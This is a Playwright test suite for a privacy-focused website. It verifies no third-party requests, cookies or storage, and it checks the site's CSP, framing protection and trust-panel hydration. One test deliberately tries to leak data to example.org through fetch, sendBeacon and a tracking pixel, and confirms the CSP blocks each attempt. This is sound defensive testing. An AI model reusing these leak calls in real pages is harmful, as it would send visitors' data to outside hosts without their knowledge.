/**
 * What these tests check, on the listed pages and in the tested browsers: no
 * third-party requests, no cookies, nothing stored without consent, no CSP
 * violations. They show behaviour in these cases; they are not a guarantee
 * for every environment.
 */
import { expect, test } from '@playwright/test';

const PAGES = ['/', '/spuren/', '/check/', '/plan/', '/dienste/', '/dienste/google/', '/alternativen/', '/transparenz/', '/methodik/', '/einstellungen/', '/warum/', '/en/', '/en/apps/google/', '/en/settings/'];

for (const path of PAGES) {
  test(`${path}: only same-origin requests, no cookies, no storage, no CSP violations`, async ({ page, context, baseURL }) => {
    const origin = new URL(baseURL!).origin;
    const foreign: string[] = [];
    const errors: string[] = [];
    page.on('request', (r) => {
      const u = new URL(r.url());
      if (u.protocol.startsWith('http') && u.origin !== origin) foreign.push(r.url());
    });
    page.on('console', (m) => {
      if (m.type() === 'error' && !/favicon/.test(m.text())) errors.push(m.text());
    });
    page.on('pageerror', (e) => errors.push(e.message));
    // Violations as the browser reports them (console text differs between engines).
    await page.addInitScript(() => {
      (window as unknown as { __csp: string[] }).__csp = [];
      document.addEventListener('securitypolicyviolation', (e) =>
        (window as unknown as { __csp: string[] }).__csp.push(`${e.effectiveDirective} ${e.blockedURI}`),
      );
    });
    await page.goto(path, { waitUntil: 'networkidle' });
    await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight)); // mouse.wheel is not supported in mobile WebKit
    await page.waitForTimeout(300);
    expect(foreign, 'third-party requests').toEqual([]);
    expect(await context.cookies()).toEqual([]);
    expect(await page.evaluate(() => localStorage.length)).toBe(0);
    expect(await page.evaluate(() => (window as unknown as { __csp: string[] }).__csp), 'CSP violations').toEqual([]);
    expect(errors.filter((e) => /Content Security Policy|Refused/.test(e)), 'CSP violations (console)').toEqual([]);
    expect(errors, 'console errors').toEqual([]);
    const csp = await page.locator('meta[http-equiv="content-security-policy"]').getAttribute('content');
    expect(csp).toContain('script-src');
    expect(csp).not.toContain('unsafe-inline');
  });
}

test('the deployed CSP (meta tag + _headers) actually blocks data leaving for other hosts', async ({ page }) => {
  const response = await page.goto('/plan/#d=google');
  // serve-dist applies dist/_headers like the host does: both policies are active.
  expect(response!.headers()['content-security-policy']).toContain("connect-src 'self'");
  // Firefox runs against a server without COOP (playwright.config.ts); everywhere else it must be there.
  if (test.info().project.name !== 'firefox') expect(response!.headers()['cross-origin-opener-policy']).toBe('same-origin');
  await expect(page.locator('meta[http-equiv="content-security-policy"]')).toHaveAttribute('content', /default-src 'self'/);
  // Chromium reports a blocked request and fails it with reason "csp"; Firefox
  // and WebKit do not report it at all. Anything else would have left the device.
  const sent: string[] = [];
  page.on('response', (r) => {
    if (!r.url().startsWith('http://localhost')) sent.push(`response ${r.url()}`);
  });
  page.on('requestfailed', (r) => {
    if (!r.url().startsWith('http://localhost') && !/csp/i.test(r.failure()?.errorText ?? '')) sent.push(`failed ${r.url()}`);
  });
  const result = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective));
    let fetchBlocked = false;
    try {
      // eslint-disable-next-line no-restricted-globals -- deliberate: the CSP must block this
      await fetch('https://example.org/leak?d=google');
    } catch {
      fetchBlocked = true;
    }
    // eslint-disable-next-line no-restricted-syntax -- deliberate: the CSP must block this
    const beacon = navigator.sendBeacon('https://example.org/beacon', 'google');
    await new Promise<void>((done) => {
      const img = new Image();
      img.onerror = () => done();
      img.onload = () => done();
      img.src = 'https://example.org/pixel.gif?d=google';
    });
    await new Promise((r) => setTimeout(r, 200));
    return { fetchBlocked, beacon, violations };
  });
  expect(result.fetchBlocked).toBe(true);
  expect(result.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src']));
  expect(sent, 'requests to other hosts').toEqual([]);
});

test('the site refuses to be embedded in a frame (frame-ancestors via header)', async ({ page, baseURL }) => {
  await page.goto('/404.html');
  const loaded = await page.evaluate(async (url) => {
    const f = document.createElement('iframe');
    f.src = url;
    document.body.append(f);
    await new Promise((r) => setTimeout(r, 1500));
    try {
      return Boolean(f.contentDocument?.querySelector('h1'));
    } catch {
      return false;
    }
  }, `${baseURL}/`);
  expect(loaded).toBe(false);
});

test('the trust panel becomes live even if the page is never idle', async ({ page }) => {
  // A busy main thread (slow phone, loaded CI runner) leaves no idle time. The
  // panel must still hydrate: before that it shows no live values and no
  // "Alles löschen". The page stays busy for 8 s; the default 5 s expectation
  // only holds if hydration does not wait for idle time indefinitely.
  await page.addInitScript(() => {
    const end = Date.now() + 8000;
    const id = setInterval(() => {
      const until = performance.now() + 45;
      while (performance.now() < until) {
        // busy: no idle period for requestIdleCallback
      }
      if (Date.now() > end) clearInterval(id);
    }, 1);
  });
  await page.goto('/einstellungen/');
  await expect(page.locator('astro-island[ssr]')).toHaveCount(0);
  await page.locator('.trust-panel summary').click();
  await expect(page.locator('.trust-pop')).toContainText('nur diese Website');
});
